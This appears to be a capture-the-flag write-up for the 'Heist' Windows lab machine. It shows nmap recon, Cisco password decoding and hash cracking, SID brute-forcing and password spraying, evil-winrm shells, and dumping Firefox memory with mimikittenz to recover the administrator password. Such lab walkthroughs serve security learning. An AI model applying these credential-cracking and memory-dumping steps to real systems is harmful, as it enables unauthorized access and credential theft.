# Heist

## Overview

Heist is an easy difficulty Windows box with an 'Issues' portal accessible on the web server, from which it is possible to gain Cisco password hashes. These hashes are cracked, and subsequently RID bruteforce and password spraying are used to gain a foothold on the box. The user is found to be running Firefox. The firefox.exe process can be dumped and searched for the administrator's password.

## Initial Recon
```
nmap -p 1-10000 -sV -sS --version-intensity 9 -T4 -Pn $IP
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 10:45 UTC
Nmap scan report for 10.10.10.149
Host is up (0.84s latency).
Not shown: 9996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 289.66 seconds
```

## User flag

### Port 80 - Issues web portal

After logging in as a guest, we can see an issue with an attachment at this url: `http://$IP/attachments/config.txt`

It's a Cisco router config file, the entire content is interesting but here are the most important parts:
```
service password-encryption
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

### Cracking passwords

`service password-encryption` -> Enable vigenere encoding on passwords in the config file
`$1$pdQG$o8nrSzsGXeaduXrjlvKc91` -> not affected by vigenere encoding, this is just md5

Vigenere encoding is trivial to reverse:  
`0242114B0E143F015F5D1E161713` -> `$uperP@ssword`
`02375012182C1A1D751618034F36415408`-> `Q4)sJu\Y8qz*A3?d`

After that, we can also work on decrypting the type 5 password using john the ripper:
```
john --format=md5crypt --wordlist=./rockyou.txt routerSecret
```
```
1g 0:00:00:25 DONE (2025-01-12 09:21) 0.03881g/s 136074p/s 136074c/s 136074C/s stealthxxx..steale
```

`$1$pdQG$o8nrSzsGXeaduXrjlvKc91` -> `stealth1agent`

### SMB / RPC

Then after tring some usernames and passwords combinaisons, we are able to connect to the smb / rpc server and list some shares:
```
smbclient -U "hazard%stealth1agent" -L $IP
```
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Nothing very interesting here but using these credentials we can try a few things like trying to enumerate other users:

```
impacket-lookupsid Hazard@$IP
```

```
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

### WINRM

After some trial and error, we found that we can have a shell with the `Chase` user and the decrypted admin password we got in the cisco config file.

```
evil-winrm -i $IP -u Chase -p 'Q4)sJu\Y8qz*A3?d'
```

```
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> ls
*Evil-WinRM* PS C:\Users\Chase\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Chase\Desktop> ls


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---        1/11/2025  10:04 PM             34 user.txt
```
Here is the user.txt flag.

## Privilege Escalation

As `Chase` user, we can import mimikittenz and try to dump some processes memory as we know that the Administrator answers on the 'Issues' portal and some `firefox` processes are running:

```
*Evil-WinRM* PS C:\Users\Chase\Documents> Get-Process
```
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    475      19     2332       5180               376   0 csrss
    285      13     2276       4804               484   1 csrss
    354      15     3480       7064              5040   1 ctfmon
    253      14     3964      13164              3776   0 dllhost
    164       9     1872       9808       0.05   6888   1 dllhost
    613      31    28880       9428               964   1 dwm
   1485      58    23276      18880              4564   1 explorer
    355      25    16408      29748       0.20   5624   1 firefox
   1079      76   190776     308136      12.61   6428   1 firefox
    347      19    10220     176268       0.16   6692   1 firefox
    401      36    50156     352080       3.11   6820   1 firefox
    378      29    30220     313548       2.22   7068   1 firefox
     49       6     1800       4604               780   1 fontdrvhost
     49       6     1524       3888               784   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    990      23     6140      15060               636   0 lsass
    223      13     3000       9808              2960   0 msdtc
      0      12      328      15044                88   0 Registry
    144       8     1612       3652              5476   1 RuntimeBroker
    539      11     5232       9584               616   0 services
    726      29    15208       9848              5232   1 ShellExperienceHost
    435      17     4796      19172              4660   1 sihost
     53       3      516       1144               268   0 smss
    473      22     5708       7932              2416   0 spoolsv
```

After some modification in mimikittenz' code to focus on the login.php POST request parameters, we get the Administrator password.

```
Invoke-mimikittenz
```
```
───▐▀▄──────▄▀▌───▄▄▄▄▄▄▄─────────────
───▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
──▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
▐▒▒▒▒mimikittenz-1.0-alpha▒▒▒▒▒▒▒▒▒▐▒█▀─
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀───
▐▒▒▒▒▒▒CAN I HAZ WAM?▒▒▒▒▒▒▒▒▒▒▒▒▌────
─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
─▐▒▒▒jamieson@dringensec.com▒▒▒▒▌─────
──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
────▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀────────

PatternName PatternMatch
----------- ------------
Login       login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

Finally, we can try to get a shell with the `Administrator` user with the password we got in the memory dump.

```
evil-winrm -i $IP -u Administrator -p '4dD!5}x/re8]FBuZ'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   8:24 AM            343 chase.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/11/2025  10:04 PM             34 root.txt
```

And here is the root flag.